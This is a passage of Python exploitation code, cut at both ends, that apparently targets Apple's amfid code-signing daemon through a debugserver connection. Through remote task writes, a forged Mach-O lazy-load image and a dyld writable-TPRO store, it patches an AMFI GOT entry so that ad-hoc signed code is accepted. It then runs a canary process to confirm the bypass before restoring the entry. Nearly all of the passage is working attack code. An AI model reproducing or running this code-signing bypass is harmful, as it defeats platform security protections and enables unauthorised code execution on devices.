                                    entry_scratch_size = entry_span
                                    base_candidates: list[int] = []
                                    entry_candidates: list[int] = []

                                    def find_zero_span(
                                        address: int,
                                        content: bytes,
                                        size: int,
                                        alignment: int,
                                    ) -> int:
                                        first = (
                                            -address
                                        ) & (alignment - 1)
                                        zeros = b"\0" * size
                                        for offset in range(
                                            first,
                                            len(content) - size + 1,
                                            alignment,
                                        ):
                                            if (
                                                content[
                                                    offset : offset + size
                                                ]
                                                == zeros
                                            ):
                                                return address + offset
                                        return 0

                                    leaf_cursor = scan_start
                                    leaf_queries = 0
                                    rw_leaf_regions = 0
                                    while (
                                        leaf_cursor < scan_end
                                        and leaf_queries
                                        < DONOR_REGION_SCAN_LIMIT
                                        and lazy_image_base == 0
                                    ):
                                        query_address = leaf_cursor
                                        query_depth = 0
                                        parent_end = scan_end
                                        leaf: tuple[
                                            int, int, bytes
                                        ] | None = None
                                        for _ in range(8):
                                            await write_memory(
                                                remote,
                                                region_address_pointer,
                                                struct.pack(
                                                    "<Q", query_address
                                                ),
                                            )
                                            await write_memory(
                                                remote,
                                                region_size_pointer,
                                                b"\0" * 8,
                                            )
                                            await write_memory(
                                                remote,
                                                region_depth_pointer,
                                                struct.pack(
                                                    "<I", query_depth
                                                ),
                                            )
                                            await write_memory(
                                                remote,
                                                region_info_pointer,
                                                b"\0"
                                                * VM_REGION_SUBMAP_INFO_SIZE_64,
                                            )
                                            await write_memory(
                                                remote,
                                                region_count_pointer,
                                                struct.pack(
                                                    "<I",
                                                    VM_REGION_SUBMAP_INFO_COUNT_64,
                                                ),
                                            )
                                            leaf_result = await call_loader(
                                                "mach_vm_region_recurse_"
                                                "amfid_lazy_leaf",
                                                mach_vm_region_recurse_address,
                                                (
                                                    target_task,
                                                    region_address_pointer,
                                                    region_size_pointer,
                                                    region_depth_pointer,
                                                    region_info_pointer,
                                                    region_count_pointer,
                                                ),
                                            )
                                            leaf_queries += 1
                                            leaf_kr = (
                                                leaf_result & 0xFFFFFFFF
                                            )
                                            if (
                                                leaf_kr
                                                == KERN_INVALID_ADDRESS
                                            ):
                                                break
                                            if leaf_kr != 0:
                                                raise ProtocolError(
                                                    "nested amfid VM scan "
                                                    f"failed: {leaf_kr}"
                                                )
                                            leaf_start = struct.unpack(
                                                "<Q",
                                                await read_memory(
                                                    remote,
                                                    region_address_pointer,
                                                    8,
                                                ),
                                            )[0]
                                            leaf_size = struct.unpack(
                                                "<Q",
                                                await read_memory(
                                                    remote,
                                                    region_size_pointer,
                                                    8,
                                                ),
                                            )[0]
                                            leaf_depth = struct.unpack(
                                                "<I",
                                                await read_memory(
                                                    remote,
                                                    region_depth_pointer,
                                                    4,
                                                ),
                                            )[0]
                                            leaf_info = await read_memory(
                                                remote,
                                                region_info_pointer,
                                                VM_REGION_SUBMAP_INFO_SIZE_64,
                                            )
                                            if leaf_size == 0:
                                                raise ProtocolError(
                                                    "nested amfid VM scan "
                                                    "returned an empty region"
                                                )
                                            is_submap = struct.unpack_from(
                                                "<I",
                                                leaf_info,
                                                VM_REGION_SUBMAP_INFO_IS_SUBMAP_OFFSET,
                                            )[0]
                                            if is_submap:
                                                parent_end = min(
                                                    parent_end,
                                                    leaf_start + leaf_size,
                                                )
                                                query_address = max(
                                                    query_address, leaf_start
                                                )
                                                query_depth = leaf_depth + 1
                                                continue
                                            leaf = (
                                                leaf_start,
                                                leaf_size,
                                                leaf_info,
                                            )
                                            break

                                        if leaf is None:
                                            next_leaf_cursor = parent_end
                                        else:
                                            (
                                                leaf_start,
                                                leaf_size,
                                                leaf_info,
                                            ) = leaf
                                            next_leaf_cursor = (
                                                leaf_start + leaf_size
                                            )
                                            current_protection = (
                                                struct.unpack_from(
                                                    "<i", leaf_info, 0
                                                )[0]
                                            )
                                            maximum_protection = (
                                                struct.unpack_from(
                                                    "<i", leaf_info, 4
                                                )[0]
                                            )
                                            leaf_flags = struct.unpack_from(
                                                "<H",
                                                leaf_info,
                                                VM_REGION_SUBMAP_INFO_FLAGS_OFFSET,
                                            )[0]
                                            if (
                                                leaf_start < scan_end
                                                and leaf_size
                                                >= PATH_BUFFER_SIZE
                                                and current_protection
                                                & (
                                                    VM_PROT_READ
                                                    | VM_PROT_WRITE
                                                )
                                                == (
                                                    VM_PROT_READ
                                                    | VM_PROT_WRITE
                                                )
                                                and maximum_protection
                                                & (
                                                    VM_PROT_READ
                                                    | VM_PROT_WRITE
                                                )
                                                == (
                                                    VM_PROT_READ
                                                    | VM_PROT_WRITE
                                                )
                                                and not (
                                                    leaf_flags
                                                    & VM_REGION_FLAG_TPRO_ENABLED
                                                )
                                            ):
                                                rw_leaf_regions += 1
                                                sample_addresses = {
                                                    leaf_start,
                                                    leaf_start
                                                    + leaf_size
                                                    - PATH_BUFFER_SIZE,
                                                }
                                                for sample_address in sorted(
                                                    sample_addresses
                                                ):
                                                    if not (
                                                        scan_start
                                                        <= sample_address
                                                        and sample_address
                                                        + PATH_BUFFER_SIZE
                                                        <= scan_end
                                                    ):
                                                        continue
                                                    try:
                                                        sample = (
                                                            await read_target(
                                                                "amfid_lazy_"
                                                                "rw_sample",
                                                                sample_address,
                                                                PATH_BUFFER_SIZE,
                                                            )
                                                        )
                                                    except ProtocolError:
                                                        continue
                                                    base_candidate = (
                                                        find_zero_span(
                                                            sample_address,
                                                            sample,
                                                            base_scratch_size,
                                                            8,
                                                        )
                                                    )
                                                    if (
                                                        base_candidate
                                                        and base_candidate
                                                        not in base_candidates
                                                    ):
                                                        base_candidates.append(
                                                            base_candidate
                                                        )
                                                    entry_candidate = (
                                                        find_zero_span(
                                                            sample_address,
                                                            sample,
                                                            entry_scratch_size,
                                                            4,
                                                        )
                                                    )
                                                    if (
                                                        entry_candidate
                                                        and entry_candidate
                                                        not in entry_candidates
                                                    ):
                                                        entry_candidates.append(
                                                            entry_candidate
                                                        )

                                                for base_candidate in (
                                                    base_candidates
                                                ):
                                                    chain_delta = (
                                                        got_address
                                                        - base_candidate
                                                    )
                                                    if not (
                                                        0
                                                        < chain_delta
                                                        <= 0xFFFFFFFF
                                                    ):
                                                        continue
                                                    for entry_candidate in (
                                                        entry_candidates
                                                    ):
                                                        entry_for_respect = (
                                                            entry_candidate
                                                            + (
                                                                respect_chain[0]
                                                                - min_ordinal
                                                            )
                                                            * 4
                                                        )
                                                        proposed_array_offset = (
                                                            entry_for_respect
                                                            - (
                                                                base_candidate
                                                                + AMFID_LAZY_DATA_OFFSET
                                                            )
                                                            - respect_chain[0]
                                                            * 4
                                                        )
                                                        if not (
                                                            0
                                                            <= proposed_array_offset
                                                            <= 0xFFFFFFFF
                                                        ):
                                                            continue
                                                        lazy_image_base = (
                                                            base_candidate
                                                        )
                                                        lazy_symbol_page = (
                                                            entry_candidate
                                                        )
                                                        symbol_array_offset = (
                                                            proposed_array_offset
                                                        )
                                                        break
                                                    if lazy_image_base != 0:
                                                        break
                                        if lazy_image_base != 0:
                                            break
                                        if next_leaf_cursor <= leaf_cursor:
                                            raise ProtocolError(
                                                "nested amfid VM scan did "
                                                "not advance"
                                            )
                                        leaf_cursor = next_leaf_cursor

                                    if lazy_image_base == 0:
                                        raise ProtocolError(
                                            "no bounded ordinary-RW scratch "
                                            "pair was found for the sparse "
                                            "lazy-load image: "
                                            f"leaf-queries={leaf_queries} "
                                            f"rw-regions={rw_leaf_regions} "
                                            f"base-candidates="
                                            f"{len(base_candidates)} "
                                            f"entry-candidates="
                                            f"{len(entry_candidates)}"
                                        )
                                    existing_scratch_snapshots = [
                                        (
                                            lazy_image_base,
                                            await read_target(
                                                "amfid_lazy_base_snapshot",
                                                lazy_image_base,
                                                base_scratch_size,
                                            ),
                                            "base",
                                        ),
                                        (
                                            lazy_symbol_page,
                                            await read_target(
                                                "amfid_lazy_entry_snapshot",
                                                lazy_symbol_page,
                                                entry_scratch_size,
                                            ),
                                            "entries",
                                        ),
                                    ]
                                    if any(
                                        any(snapshot)
                                        for _, snapshot, _
                                        in existing_scratch_snapshots
                                    ):
                                        raise ProtocolError(
                                            "selected amfid scratch spans "
                                            "changed after zero-run discovery"
                                        )

                                chain_offset = (
                                    got_address - lazy_image_base
                                )
                                if not (0 < chain_offset <= 0xFFFFFFFF):
                                    raise ProtocolError(
                                        "lazy-load chain offset is outside "
                                        "the uint32 range: "
                                        f"0x{chain_offset:x}"
                                    )
                                symbols_count = max_ordinal + 1
                                image_header = struct.pack(
                                    "<IiiIIIII",
                                    MH_MAGIC_64,
                                    CPU_TYPE_ARM64,
                                    CPU_SUBTYPE_ARM64E,
                                    MH_DYLIB,
                                    3,
                                    160,
                                    0,
                                    0,
                                )
                                image_header += struct.pack(
                                    "<II16sQQQQiiII",
                                    LC_SEGMENT_64,
                                    72,
                                    b"__TEXT\0\0\0\0\0\0\0\0\0\0",
                                    lazy_image_base,
                                    AMFID_LAZY_DATA_OFFSET,
                                    0,
                                    AMFID_LAZY_DATA_OFFSET,
                                    VM_PROT_READ,
                                    VM_PROT_READ,
                                    0,
                                    0,
                                )
                                image_header += struct.pack(
                                    "<II16sQQQQiiII",
                                    LC_SEGMENT_64,
                                    72,
                                    b"__LINKEDIT\0\0\0\0\0\0",
                                    lazy_image_base
                                    + AMFID_LAZY_DATA_OFFSET,
                                    AMFID_LAZY_SYMBOL_ARRAY_OFFSET,
                                    AMFID_LAZY_DATA_OFFSET,
                                    AMFID_LAZY_SYMBOL_ARRAY_OFFSET,
                                    VM_PROT_READ,
                                    VM_PROT_READ,
                                    0,
                                    0,
                                )
                                image_header += struct.pack(
                                    "<IIII",
                                    LC_LAZY_LOAD_DYLIB_INFO,
                                    16,
                                    AMFID_LAZY_DATA_OFFSET,
                                    AMFID_LAZY_SYMBOL_ARRAY_OFFSET,
                                )
                                if (
                                    len(image_header)
                                    > AMFID_LAZY_FLAG_OFFSET
                                    or AMFID_LAZY_FLAG_OFFSET + 4
                                    > AMFID_LAZY_DATA_OFFSET
                                ):
                                    raise ProtocolError(
                                        "synthetic Mach-O load commands "
                                        "overlap the lazy-loaded flag/blob"
                                    )
                                lazy_blob = bytearray(
                                    AMFID_LAZY_SYMBOL_ARRAY_OFFSET
                                )
                                struct.pack_into(
                                    "<IIHHIII",
                                    lazy_blob,
                                    0,
                                    AMFID_LAZY_PATH_OFFSET,
                                    AMFID_LAZY_FLAG_OFFSET,
                                    0,
                                    DYLD_CHAINED_PTR_32,
                                    chain_offset,
                                    symbols_count,
                                    symbol_array_offset,
                                )
                                libmis_path = (
                                    LIBMIS_PATH.encode("utf-8") + b"\0"
                                )
                                allow_symbol = (
                                    b"_kMISValidationOptionAllowAdHocSigning\0"
                                )
                                respect_symbol = (
                                    b"_kMISValidationOptionRespectUppTrustAndAuthorization\0"
                                )
                                for offset, value, label in (
                                    (
                                        AMFID_LAZY_PATH_OFFSET,
                                        libmis_path,
                                        "path",
                                    ),
                                    (
                                        AMFID_LAZY_ALLOW_SYMBOL_OFFSET,
                                        allow_symbol,
                                        "allow symbol",
                                    ),
                                    (
                                        AMFID_LAZY_RESPECT_SYMBOL_OFFSET,
                                        respect_symbol,
                                        "respect symbol",
                                    ),
                                ):
                                    end = offset + len(value)
                                    if end > len(lazy_blob):
                                        raise ProtocolError(
                                            f"synthetic lazy-load {label} "
                                            "overlaps the symbol array"
                                        )
                                    lazy_blob[offset:end] = value

                                async def stage_lazy_bytes(
                                    label: str,
                                    address: int,
                                    value: bytes,
                                ) -> None:
                                    if not (
                                        0 < len(value) <= PATH_BUFFER_SIZE
                                    ):
                                        raise ProtocolError(
                                            "invalid lazy-load staging size "
                                            f"for {label}: {len(value)}"
                                        )
                                    await write_memory(
                                        remote, path_address, value
                                    )
                                    write_result = await call_loader(
                                        "task_write_amfid_lazy_" + label,
                                        image_base + TASK_WRITE_OFFSET,
                                        (
                                            target_task,
                                            address,
                                            path_address,
                                            len(value),
                                        ),
                                    )
                                    if write_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "amfid lazy-load staging failed "
                                            f"for {label}: "
                                            f"{write_result & 0xFFFFFFFF}"
                                        )
                                    observed = await read_target(
                                        "amfid_lazy_" + label,
                                        address,
                                        len(value),
                                    )
                                    if observed != value:
                                        raise ProtocolError(
                                            "amfid lazy-load staging did "
                                            f"not verify for {label}"
                                        )

                                allow_entry = (
                                    lazy_image_base
                                    + AMFID_LAZY_DATA_OFFSET
                                    + symbol_array_offset
                                    + respect_chain[0] * 4
                                )
                                respect_entry = (
                                    lazy_image_base
                                    + AMFID_LAZY_DATA_OFFSET
                                    + symbol_array_offset
                                    + allow_chain[0] * 4
                                )
                                flag_address = (
                                    lazy_image_base
                                    + AMFID_LAZY_FLAG_OFFSET
                                )
                                control_chain_address = (
                                    lazy_image_base
                                    + AMFID_LAZY_CONTROL_CHAIN_OFFSET
                                )
                                control_blob = bytearray(lazy_blob)
                                struct.pack_into(
                                    "<IIHHIII",
                                    control_blob,
                                    0,
                                    AMFID_LAZY_PATH_OFFSET,
                                    AMFID_LAZY_FLAG_OFFSET,
                                    0,
                                    DYLD_CHAINED_PTR_32,
                                    AMFID_LAZY_CONTROL_CHAIN_OFFSET,
                                    1,
                                    AMFID_LAZY_CONTROL_SYMBOL_ARRAY_OFFSET,
                                )
                                struct.pack_into(
                                    "<I",
                                    control_blob,
                                    AMFID_LAZY_CONTROL_SYMBOL_ARRAY_OFFSET,
                                    AMFID_LAZY_ALLOW_SYMBOL_OFFSET,
                                )

                                async def run_lazy_adhoc_canary(
                                ) -> tuple[int, str]:
                                    trigger_script = str(
                                        Path(__file__).with_name(
                                            "debugserver_carrier_spawn.py"
                                        )
                                    )
                                    process = (
                                        await asyncio.create_subprocess_exec(
                                            sys.executable,
                                            trigger_script,
                                            args.host,
                                            str(args.port),
                                            "--pid",
                                            str(args.expected_parent),
                                            "--timeout",
                                            "30",
                                            "--run-amfid-admission-canary",
                                            stdout=asyncio.subprocess.PIPE,
                                            stderr=asyncio.subprocess.STDOUT,
                                        )
                                    )
                                    try:
                                        output, _ = await asyncio.wait_for(
                                            process.communicate(), 25
                                        )
                                    except BaseException:
                                        if process.returncode is None:
                                            process.terminate()
                                            try:
                                                await asyncio.wait_for(
                                                    process.wait(), 2
                                                )
                                            except BaseException:
                                                process.kill()
                                                await process.wait()
                                        raise
                                    return (
                                        process.returncode or 0,
                                        output.decode("utf-8", "replace"),
                                    )

                                staging_error: BaseException | None = None
                                option_is_patched = False
                                control_passed = False
                                canary_passed = False
                                try:
                                    await stage_lazy_bytes(
                                        "header",
                                        lazy_image_base,
                                        image_header,
                                    )
                                    await stage_lazy_bytes(
                                        "blob",
                                        lazy_image_base
                                        + AMFID_LAZY_DATA_OFFSET,
                                        bytes(lazy_blob),
                                    )
                                    await stage_lazy_bytes(
                                        "allow_entry",
                                        allow_entry,
                                        struct.pack(
                                            "<I",
                                            AMFID_LAZY_ALLOW_SYMBOL_OFFSET,
                                        ),
                                    )
                                    await stage_lazy_bytes(
                                        "respect_entry",
                                        respect_entry,
                                        struct.pack(
                                            "<I",
                                            AMFID_LAZY_RESPECT_SYMBOL_OFFSET,
                                        ),
                                    )
                                    flag_value = await read_target(
                                        "amfid_lazy_loaded_flag",
                                        flag_address,
                                        4,
                                    )
                                    if flag_value != b"\0" * 4:
                                        raise ProtocolError(
                                            "synthetic lazy-load flag is not "
                                            "initially zero"
                                        )
                                    staged_got = await read_target(
                                        "amfid_lazy_preflight_got_staged",
                                        got_address,
                                        8,
                                    )
                                    if staged_got != respect_pointer:
                                        raise ProtocolError(
                                            "AMFI GOT changed during "
                                            "staging-only lazy-load preflight"
                                        )
                                    if (
                                        args.amfid_adhoc_option_probe
                                        is not None
                                    ):
                                        await stage_lazy_bytes(
                                            "control_blob",
                                            lazy_image_base
                                            + AMFID_LAZY_DATA_OFFSET,
                                            bytes(control_blob),
                                        )
                                        await stage_lazy_bytes(
                                            "control_chain",
                                            control_chain_address,
                                            struct.pack("<Q", 0x80000000),
                                        )
                                        await remote_call(
                                            "dyld_lazy_load_control",
                                            dyld_lazy_load,
                                            (flag_address, lazy_image_base),
                                        )
                                        control_flag = await read_target(
                                            "amfid_lazy_control_flag",
                                            flag_address,
                                            4,
                                        )
                                        if control_flag != struct.pack(
                                            "<I", 1
                                        ):
                                            raise ProtocolError(
                                                "dyld lazy-load control did "
                                                "not set its loaded flag: "
                                                f"{control_flag.hex()}"
                                            )
                                        control_value = await read_target(
                                            "amfid_lazy_control_value",
                                            control_chain_address,
                                            8,
                                        )
                                        if control_value != allow_adhoc_pointer:
                                            raise ProtocolError(
                                                "dyld lazy-load control did "
                                                "not resolve the exact libmis "
                                                "symbol: "
                                                f"{control_value.hex()}"
                                            )
                                        control_got = await read_target(
                                            "amfid_lazy_control_got",
                                            got_address,
                                            8,
                                        )
                                        if control_got != respect_pointer:
                                            raise ProtocolError(
                                                "AMFI GOT changed during the "
                                                "isolated lazy-load control"
                                            )
                                        control_passed = True

                                        await stage_lazy_bytes(
                                            "install_flag_reset",
                                            flag_address,
                                            b"\0" * 4,
                                        )
                                        await stage_lazy_bytes(
                                            "install_blob",
                                            lazy_image_base
                                            + AMFID_LAZY_DATA_OFFSET,
                                            bytes(lazy_blob),
                                        )
                                        await remote_call(
                                            "dyld_lazy_load_install",
                                            dyld_lazy_load,
                                            (flag_address, lazy_image_base),
                                        )
                                        # Pessimistically require cleanup as
                                        # soon as the mutating call returns.
                                        option_is_patched = True
                                        install_flag = await read_target(
                                            "amfid_lazy_install_flag",
                                            flag_address,
                                            4,
                                        )
                                        if install_flag != struct.pack(
                                            "<I", 1
                                        ):
                                            raise ProtocolError(
                                                "dyld lazy-load install did "
                                                "not set its loaded flag: "
                                                f"{install_flag.hex()}"
                                            )
                                        installed_got = await read_target(
                                            "amfid_lazy_install_got",
                                            got_address,
                                            8,
                                        )
                                        if installed_got != allow_adhoc_pointer:
                                            raise ProtocolError(
                                                "dyld lazy-load install did "
                                                "not write AllowAdHocSigning: "
                                                f"{installed_got.hex()}"
                                            )
                                        print(
                                            "amfid-adhoc-option=active "
                                            f"pid={target_pid} "
                                            f"framework=0x{framework_base:x} "
                                            f"got=0x{got_address:x} "
                                            "writer=dyld-lazy-load",
                                            flush=True,
                                        )

                                        (
                                            canary_returncode,
                                            canary_output,
                                        ) = await run_lazy_adhoc_canary()
                                        print(
                                            "amfid-adhoc-canary-output="
                                            + canary_output.strip().replace(
                                                "\n", " | "
                                            ),
                                            flush=True,
                                        )
                                        if canary_returncode != 0:
                                            raise ProtocolError(
                                                "ad-hoc admission canary "
                                                "launcher failed: "
                                                "returncode="
                                                f"{canary_returncode}"
                                            )
                                        if (
                                            "amfid-admission-canary-wait "
                                            not in canary_output
                                            or "status=0x00000000 exit=0"
                                            not in canary_output
                                        ):
                                            raise ProtocolError(
                                                "ad-hoc admission canary did "
                                                "not exit cleanly"
                                            )
                                        canary_passed = True

                                        await stage_lazy_bytes(
                                            "restore_flag_reset",
                                            flag_address,
                                            b"\0" * 4,
                                        )
                                        await stage_lazy_bytes(
                                            "restore_blob",
                                            lazy_image_base
                                            + AMFID_LAZY_DATA_OFFSET,
                                            bytes(lazy_blob),
                                        )
                                        await remote_call(
                                            "dyld_lazy_load_restore",
                                            dyld_lazy_load,
                                            (flag_address, lazy_image_base),
                                        )
                                        restore_flag = await read_target(
                                            "amfid_lazy_restore_flag",
                                            flag_address,
                                            4,
                                        )
                                        restored_got = await read_target(
                                            "amfid_lazy_restore_got",
                                            got_address,
                                            8,
                                        )
                                        if restore_flag != struct.pack(
                                            "<I", 1
                                        ):
                                            raise ProtocolError(
                                                "dyld lazy-load restore did "
                                                "not set its loaded flag: "
                                                f"{restore_flag.hex()}"
                                            )
                                        if restored_got != respect_pointer:
                                            raise ProtocolError(
                                                "dyld lazy-load restore did "
                                                "not write RespectUpp: "
                                                f"{restored_got.hex()}"
                                            )
                                        option_is_patched = False
                                except BaseException as error:
                                    staging_error = error
                                    raise
                                finally:
                                    restore_errors: list[str] = []
                                    if (
                                        args.amfid_adhoc_option_probe
                                        is not None
                                    ):
                                        try:
                                            cleanup_got = await read_target(
                                                "amfid_lazy_cleanup_got",
                                                got_address,
                                                8,
                                            )
                                            if cleanup_got == respect_pointer:
                                                option_is_patched = False
                                            elif (
                                                cleanup_got
                                                == allow_adhoc_pointer
                                            ):
                                                option_is_patched = True
                                            else:
                                                raise ProtocolError(
                                                    "AMFI GOT has an unknown "
                                                    "value during cleanup: "
                                                    f"{cleanup_got.hex()}"
                                                )
                                        except BaseException as error:
                                            restore_errors.append(
                                                "GOT state: " + str(error)
                                            )
                                    if option_is_patched:
                                        try:
                                            await stage_lazy_bytes(
                                                "cleanup_flag_reset",
                                                flag_address,
                                                b"\0" * 4,
                                            )
                                            await stage_lazy_bytes(
                                                "cleanup_blob",
                                                lazy_image_base
                                                + AMFID_LAZY_DATA_OFFSET,
                                                bytes(lazy_blob),
                                            )
                                            await stage_lazy_bytes(
                                                "cleanup_allow_entry",
                                                allow_entry,
                                                struct.pack(
                                                    "<I",
                                                    AMFID_LAZY_ALLOW_SYMBOL_OFFSET,
                                                ),
                                            )
                                            await stage_lazy_bytes(
                                                "cleanup_respect_entry",
                                                respect_entry,
                                                struct.pack(
                                                    "<I",
                                                    AMFID_LAZY_RESPECT_SYMBOL_OFFSET,
                                                ),
                                            )
                                            await remote_call(
                                                "dyld_lazy_load_cleanup_restore",
                                                dyld_lazy_load,
                                                (
                                                    flag_address,
                                                    lazy_image_base,
                                                ),
                                            )
                                            cleanup_got = await read_target(
                                                "amfid_lazy_cleanup_restored_got",
                                                got_address,
                                                8,
                                            )
                                            if cleanup_got != respect_pointer:
                                                raise ProtocolError(
                                                    "cleanup lazy-load did not "
                                                    "restore RespectUpp: "
                                                    f"{cleanup_got.hex()}"
                                                )
                                            option_is_patched = False
                                        except BaseException as error:
                                            restore_errors.append(
                                                "GOT restore: " + str(error)
                                            )
                                    if not option_is_patched:
                                        for (
                                            scratch_address,
                                            snapshot,
                                            scratch_label,
                                        ) in existing_scratch_snapshots:
                                            try:
                                                await stage_lazy_bytes(
                                                    "restore_"
                                                    + scratch_label,
                                                    scratch_address,
                                                    snapshot,
                                                )
                                            except BaseException as error:
                                                restore_errors.append(
                                                    f"{scratch_label}: "
                                                    f"{error}"
                                                )
                                    else:
                                        restore_errors.append(
                                            "scratch retained because AMFI "
                                            "GOT could not be restored"
                                        )
                                    if restore_errors:
                                        message = "; ".join(
                                            restore_errors
                                        )
                                        if staging_error is None:
                                            raise ProtocolError(
                                                "amfid lazy-load scratch "
                                                "restore failed: " + message
                                            )
                                        print(
                                            "amfid-lazy-load-scratch-"
                                            f"restore-error={message}",
                                            file=sys.stderr,
                                            flush=True,
                                        )
                                for (
                                    scratch_address,
                                    snapshot,
                                    scratch_label,
                                ) in existing_scratch_snapshots:
                                    restored = await read_target(
                                        "amfid_lazy_restored_"
                                        + scratch_label,
                                        scratch_address,
                                        len(snapshot),
                                    )
                                    if restored != snapshot:
                                        raise ProtocolError(
                                            "amfid lazy-load scratch was not "
                                            f"restored for {scratch_label}"
                                        )
                                final_got = await read_target(
                                    "amfid_lazy_preflight_got_final",
                                    got_address,
                                    8,
                                )
                                if final_got != respect_pointer:
                                    raise ProtocolError(
                                        "AMFI GOT was not restored after the "
                                        "lazy-load operation"
                                    )
                                mapped_size = (
                                    0
                                    if existing_scratch_snapshots
                                    else 2 * DONOR_PAGE_SIZE
                                )
                                scratch_mode = (
                                    "borrowed-rw"
                                    if existing_scratch_snapshots
                                    else "fixed-pages"
                                )
                                if (
                                    args.amfid_adhoc_option_probe
                                    is not None
                                ):
                                    if not (
                                        control_passed and canary_passed
                                    ):
                                        raise ProtocolError(
                                            "lazy-load probe completed without "
                                            "its control and canary proofs"
                                        )
                                    print(
                                        "ptrauth-loader-amfid-adhoc-option-"
                                        "probe=success "
                                        f"loader-pid={args.pid} "
                                        f"target-pid={target_pid} "
                                        "writer=dyld-lazy-load "
                                        "control=passed canary=passed "
                                        "restored=1"
                                    )
                                else:
                                    print(
                                        "ptrauth-loader-amfid-lazy-load-"
                                        "preflight=success "
                                        f"loader-pid={args.pid} "
                                        f"target-pid={target_pid} "
                                        f"image=0x{lazy_image_base:x} "
                                        f"symbol-page="
                                        f"0x{lazy_symbol_page:x} "
                                        f"scratch={scratch_mode} "
                                        f"mapped-size=0x{mapped_size:x} "
                                        f"sparse-span=0x{sparse_span:x} "
                                        f"chain-offset=0x{chain_offset:x} "
                                        f"install-ordinal="
                                        f"0x{respect_chain[0]:x} "
                                        f"restore-ordinal="
                                        f"0x{allow_chain[0]:x} "
                                        "got-unchanged=1"
                                    )
                                return 0
                            dyld_call_with_writable_tpro = (
                                libdyld_base
                                + LIBDYLD_WRITABLE_TPRO_CALL_OFFSET
                            )
                            observed_tpro_call = await read_target(
                                "libdyld_writable_tpro_call",
                                dyld_call_with_writable_tpro,
                                len(
                                    LIBDYLD_WRITABLE_TPRO_CALL_ORIGINAL
                                ),
                            )
                            if (
                                observed_tpro_call
                                != LIBDYLD_WRITABLE_TPRO_CALL_ORIGINAL
                            ):
                                raise ProtocolError(
                                    "exact libdyld writable-TPRO call "
                                    "mismatch: "
                                    f"{observed_tpro_call.hex()}"
                                )
                            signed_tpro_store_callback = await call_loader(
                                "make_sym_callable_dyld_tpro_store",
                                image_base + MAKE_SYM_CALLABLE_OFFSET,
                                (tpro_store_callback,),
                            )
                            if signed_tpro_store_callback == 0:
                                raise ProtocolError(
                                    "could not sign dyld TPRO store callback"
                                )
                            store_context = await write_remote_string(
                                "amfid_tpro_store_context", "C" * 63
                            )
                            if store_context & 7:
                                raise ProtocolError(
                                    "unaligned dyld TPRO store context"
                                )
                            option_is_patched = False

                            async def write_validation_option_pointer(
                                label: str,
                                expected: bytes,
                                replacement: bytes,
                            ) -> None:
                                nonlocal option_is_patched
                                current = await read_target(
                                    "amfid_adhoc_got_" + label,
                                    got_address,
                                    8,
                                )
                                if current != expected:
                                    raise ProtocolError(
                                        "AMFI option GOT changed before "
                                        f"{label}: expected="
                                        f"{expected.hex()} observed="
                                        f"{current.hex()}"
                                    )
                                replacement_value = struct.unpack(
                                    "<Q", replacement
                                )[0]
                                context = bytearray(64)
                                struct.pack_into(
                                    "<Q",
                                    context,
                                    0x20,
                                    store_context + 0x30,
                                )
                                struct.pack_into(
                                    "<Q",
                                    context,
                                    0x28,
                                    store_context + 0x38,
                                )
                                struct.pack_into(
                                    "<Q", context, 0x30, got_address
                                )
                                struct.pack_into(
                                    "<Q",
                                    context,
                                    0x38,
                                    replacement_value,
                                )
                                await write_memory(
                                    remote, path_address, bytes(context)
                                )
                                context_write = await call_loader(
                                    "task_write_amfid_tpro_context_" + label,
                                    image_base + TASK_WRITE_OFFSET,
                                    (
                                        target_task,
                                        store_context,
                                        path_address,
                                        len(context),
                                    ),
                                )
                                if context_write & 0xFFFFFFFF:
                                    raise ProtocolError(
                                        "amfid TPRO context write failed: "
                                        f"{context_write & 0xFFFFFFFF}"
                                    )
                                observed_context = await read_target(
                                    "amfid_tpro_context_" + label,
                                    store_context,
                                    len(context),
                                )
                                if observed_context != bytes(context):
                                    raise ProtocolError(
                                        "amfid TPRO context did not verify"
                                    )
                                call_error: BaseException | None = None
                                try:
                                    await remote_call(
                                        "dyld_writable_tpro_store_" + label,
                                        dyld_call_with_writable_tpro,
                                        (
                                            signed_tpro_store_callback,
                                            store_context,
                                        ),
                                    )
                                except BaseException as error:
                                    call_error = error
                                    raise
                                finally:
                                    try:
                                        observed = await read_target(
                                            "amfid_adhoc_got_after_" + label,
                                            got_address,
                                            8,
                                        )
                                        option_is_patched = (
                                            observed == allow_adhoc_pointer
                                        )
                                        if (
                                            call_error is None
                                            and observed != replacement
                                        ):
                                            raise ProtocolError(
                                                "dyld TPRO store did not "
                                                "write the expected pointer: "
                                                f"{observed.hex()}"
                                            )
                                    except BaseException:
                                        if call_error is None:
                                            raise
                                print(
                                    "amfid-adhoc-tpro-store "
                                    f"phase={label} got=0x{got_address:x} "
                                    f"value=0x{replacement_value:x}"
                                )

                            async def run_adhoc_canary() -> tuple[int, str]:
                                trigger_script = str(
                                    Path(__file__).with_name(
                                        "debugserver_carrier_spawn.py"
                                    )
                                )
                                process = await asyncio.create_subprocess_exec(
                                    sys.executable,
                                    trigger_script,
                                    args.host,
                                    str(args.port),
                                    "--pid",
                                    str(args.expected_parent),
                                    "--timeout",
                                    "30",
                                    "--run-amfid-admission-canary",
                                    stdout=asyncio.subprocess.PIPE,
                                    stderr=asyncio.subprocess.STDOUT,
                                )
                                try:
                                    output, _ = await asyncio.wait_for(
                                        process.communicate(), 25
                                    )
                                except BaseException:
                                    if process.returncode is None:
                                        process.terminate()
                                        try:
                                            await asyncio.wait_for(
                                                process.wait(), 2
                                            )
                                        except BaseException:
                                            process.kill()
                                            await process.wait()
                                    raise
                                return (
                                    process.returncode or 0,
                                    output.decode("utf-8", "replace"),
                                )

                            adhoc_error: BaseException | None = None
                            try:
                                await write_validation_option_pointer(
                                    "install",
                                    respect_pointer,
                                    allow_adhoc_pointer,
                                )
                                print(
                                    "amfid-adhoc-option=active "
                                    f"pid={target_pid} "
                                    f"framework=0x{framework_base:x} "
                                    f"got=0x{got_address:x} "
                                    f"respect-global=0x{respect_global:x} "
                                    f"allow-adhoc-global="
                                    f"0x{allow_adhoc_global:x}",
                                    flush=True,
                                )
                                canary_returncode, canary_output = (
                                    await run_adhoc_canary()
                                )
                                print(
                                    "amfid-adhoc-canary-output="
                                    + canary_output.strip().replace(
                                        "\n", " | "
                                    ),
                                    flush=True,
                                )
                                if canary_returncode != 0:
                                    raise ProtocolError(
                                        "ad-hoc admission canary launcher "
                                        "failed: returncode="
                                        f"{canary_returncode}"
                                    )
                                if (
                                    "amfid-admission-canary-wait "
                                    not in canary_output
